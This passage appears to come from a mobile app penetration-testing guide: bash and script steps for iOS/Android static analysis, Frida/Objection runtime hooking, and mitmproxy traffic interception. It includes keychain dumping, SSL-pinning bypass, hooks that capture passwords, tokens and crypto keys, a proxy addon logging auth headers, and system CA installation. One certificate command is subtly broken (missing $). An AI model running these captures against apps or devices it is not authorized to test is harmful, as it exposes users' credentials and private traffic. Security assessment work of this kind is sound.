otool -hV $BINARY_PATH 2>&1 | tee $MOB/static/ios_arch.txt

# Check protections (PIE, ARC, stack canary, encryption)
echo "=== Binary Protections ==="
echo "PIE: $(otool -hV $BINARY_PATH 2>/dev/null | grep -c MH_PIE)"
echo "ARC: $(otool -lV $BINARY_PATH 2>/dev/null | grep -c '__objc_arc')"
echo "Stack Canary: $(otool -lV $BINARY_PATH 2>/dev/null | grep -c '___stack_chk_fail')"
echo "Encrypted: $(otool -lV $BINARY_PATH 2>/dev/null | grep -c 'LC_ENCRYPTION_INFO')"

# Extract classes and methods (class-dump or dsdump)
class-dump-swift $BINARY_PATH > $MOB/static/ios_classes.txt 2>&1 || \
  dsdump --swift $BINARY_PATH > $MOB/static/ios_classes.txt 2>&1

# String extraction from binary
strings $BINARY_PATH | grep -iE "http|api|key|secret|password|token|bearer|firebase|aws" | \
  sort -u | tee $MOB/static/ios_binary_strings.txt

# Embedded frameworks analysis
find $BINARY_PATH/Frameworks -name "*.dylib" 2>/dev/null | while read fw; do
  echo "=== Framework: $(basename $fw) ==="
  strings $fw | grep -iE "http|api|key|secret" | head -10
done | tee $MOB/static/ios_frameworks.txt
```

### Phase 2: Runtime Instrumentation (Frida + Objection)
```bash
# Objection exploration (runtime hooking framework)
objection -g $BUNDLE_ID explore 2>&1 << 'OBJEOF'

# List loaded classes
ios hooking list classes

# Search for classes with specific patterns
ios hooking search classes api
ios hooking search classes key
ios hooking search classes token

# Dump keychain data
ios keychain dump

# Dump user defaults (SharedPreferences equivalent)
ios nsuserdefaults get

# List installed apps (device context)
ios apps list

# Dump binary info
ios info binary

# Bypass SSL pinning
ios sslpinning disable

# List URLs currently loaded
ios plist get NSAppTransportSecurity
OBJEOF

# Frida runtime class enumeration
frida -U -f $BUNDLE_ID --no-pause -e '
if (ObjC.available) {
    ObjC.enumerateLoadedClasses({
        onMatch: function(name) {
            if (name.indexOf("API") !== -1 || name.indexOf("Auth") !== -1 ||
                name.indexOf("Token") !== -1 || name.indexOf("Key") !== -1) {
                console.log(name);
            }
        },
        onComplete: function() {}
    });
}' 2>&1 | tee $MOB/frida/ios_class_enum.txt
```

## Runtime Instrumentation Methodology

### Dynamic Analysis Strategy
```bash
# Step 1: Set up instrumentation environment
# - Rooted Android device with Magisk + Frida Server
# - OR jailbroken iOS device with Frida Server
# - Frida tools on workstation: pip install frida-tools objection

# Step 2: Map attack surface via class enumeration
frida -U -f $PACKAGE_NAME --no-pause -l class_mapper.js 2>&1 | tee $MOB/frida/class_map.txt
# class_mapper.js enumerates all loaded classes and categorizes them
# Focus on: Auth, Login, Key, Token, Crypto, Network, Pin, Security

# Step 3: Hook authentication flow
frida -U -f $PACKAGE_NAME --no-pause -l auth_hooks.js 2>&1 | tee $MOB/frida/auth_hooks.txt
# Hooks: login(), authenticate(), validateToken(), refreshToken(), logout()
# Captures: usernames, passwords, tokens, API responses

# Step 4: Hook cryptographic operations
frida -U -f $PACKAGE_NAME --no-pause -l crypto_hooks.js 2>&1 | tee $MOB/frida/crypto_hooks.txt
# Hooks: Cipher.init(), SecretKey, MessageDigest, HMAC, IvParameterSpec
# Captures: keys, IVs, algorithms, plaintext before encryption

# Step 5: Hook network layer
frida -U -f $PACKAGE_NAME --no-pause -l network_hooks.js 2>&1 | tee $MOB/frida/network_hooks.txt
# Hooks: OkHttp3 Interceptor, URL.openConnection(), HttpURLConnection
# Captures: URLs, headers (Authorization, cookies), request/response bodies

# Step 6: Hook local storage operations
frida -U -f $PACKAGE_NAME --no-pause -l storage_hooks.js 2>&1 | tee $MOB/frida/storage_hooks.txt
# Hooks: SharedPreferences.edit(), SQLiteDatabase, EncryptedSharedPreferences
# Captures: keys stored, tokens cached, database queries
```

## Traffic Interception: Advanced Setup

### mitmproxy + Frida Mobile Proxy
```bash
# Step 1: Start mitmproxy with custom addons
mitmdump \
  -p 8080 \
  -s $MOB/traffic/addon_capture.py \
  --set console_eventlog_verbosity=error \
  -w $MOB/traffic/traffic.mitm \
  2>&1 &

# Custom mitmproxy addon for capturing sensitive data
cat > $MOB/traffic/addon_capture.py << 'PYADDON'
from mitmproxy import http
import json

class CaptureAddon:
    def request(self, flow: http.HTTPFlow):
        # Log all requests with sensitive headers
        sensitive_headers = ['authorization', 'cookie', 'x-api-key', 'x-auth-token']
        for h in sensitive_headers:
            if h in flow.request.headers:
                print(f"[AUTH] {flow.request.method} {flow.request.url} | {h}: {flow.request.headers[h]}")

    def response(self, flow: http.HTTPFlow):
        # Log response containing tokens/sessions
        content_type = flow.response.headers.get("content-type", "")
        if "json" in content_type:
            try:
                body = json.loads(flow.response.text)
                text = flow.response.text.lower()
                if any(k in text for k in ['token', 'session', 'auth', 'key']):
                    print(f"[TOKEN] {flow.request.url} | {flow.response.status}")
                    print(f"  Body contains sensitive fields: {json.dumps({k:v for k,v in body.items() if any(s in k.lower() for s in ['token','key','session','auth','secret'])})}")
            except:
                pass

addons = [CaptureAddon()]
PYADDON

# Step 2: Configure Android proxy + Frida SSL bypass
# Run Frida SSL bypass FIRST, then set proxy
adb shell settings put global http_proxy $LHOST:8080

# Step 3: For iOS — install mitmproxy CA cert
# Profile: http://mitm.it/cert/cer.pem
# Install on device: Settings > Profile > Install
# Enable full trust: Settings > General > About > Certificate Trust Settings

# Step 4: Burp Suite mobile configuration (alternative)
# Burp → Proxy → Options → Edit → Bind to all interfaces
# Android: Install CA from http://burp/cert
# iOS: Generate mobile profile from Burp → Import on device
```

### Certificate Installation for Traffic Capture
```bash
# Android: System CA store (rooted)
# Convert PEM to Android system cert format
openssl x509 -inform PEM -subject_hash_old -in /path/to/cert.pem | head -1
CERT_HASH=$(openssl x509 -inform PEM -subject_hash_old -in /path/to/cert.pem | head -1)
cp /path/to/cert.pem $CERT_HASH.0
openssl x509 -inform PEM -text -fingerprint -noout -in /CERT_HASH.0 >> $CERT_HASH.0

# Push to system CA store
adb push $CERT_HASH.0 /system/etc/security/cacerts/
chmod 644 /system/etc/security/cacerts/$CERT_HASH.0

# iOS: Trust MITM CA certificate
# Install via mobileconfig profile
# Settings > General > Profiles > Install
# Settings > General > About > Certificate Trust Settings > Enable

# Verify traffic is being captured
curl -s http://httpbin.org/ip 2>&1
# Check mitmproxy/Burp proxy for the request
```
```

